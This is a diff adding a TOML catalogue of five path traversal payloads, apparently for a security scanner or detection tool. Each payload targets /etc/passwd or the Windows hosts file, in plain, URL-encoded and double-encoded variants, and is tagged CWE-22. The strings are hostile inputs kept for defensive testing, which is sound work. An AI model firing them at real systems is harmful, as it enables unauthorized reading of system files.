@@ -1,0 +1,51 @@
+# Path Traversal Payloads
+
+[[payloads]]
+id = "path-001"
+name = "Basic Path Traversal"
+category = "PathTraversal"
+pattern = "../../../etc/passwd"
+description = "Attempts to access system files using directory traversal"
+risk_level = "HIGH"
+cwe_id = "CWE-22"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "path-002"
+name = "Windows Path Traversal"
+category = "PathTraversal"
+pattern = "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+description = "Windows directory traversal to access hosts file"
+risk_level = "HIGH"
+cwe_id = "CWE-22"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "path-003"
+name = "Double Dot Traversal"
+category = "PathTraversal"
+pattern = "....//....//....//etc/passwd"
+description = "Path traversal with double dots and slashes"
+risk_level = "HIGH"
+cwe_id = "CWE-22"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "path-004"
+name = "URL Encoded Path Traversal"
+category = "PathTraversal"
+pattern = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+description = "URL encoded path traversal"
+risk_level = "HIGH"
+cwe_id = "CWE-22"
+owasp_category = "A01:2021"
+
+[[payloads]]
+id = "path-005"
+name = "Double Encoded Path Traversal"
+category = "PathTraversal"
+pattern = "..%252f..%252f..%252fetc%252fpasswd"
+description = "Double URL encoded path traversal"
+risk_level = "HIGH"
+cwe_id = "CWE-22"
+owasp_category = "A01:2021"
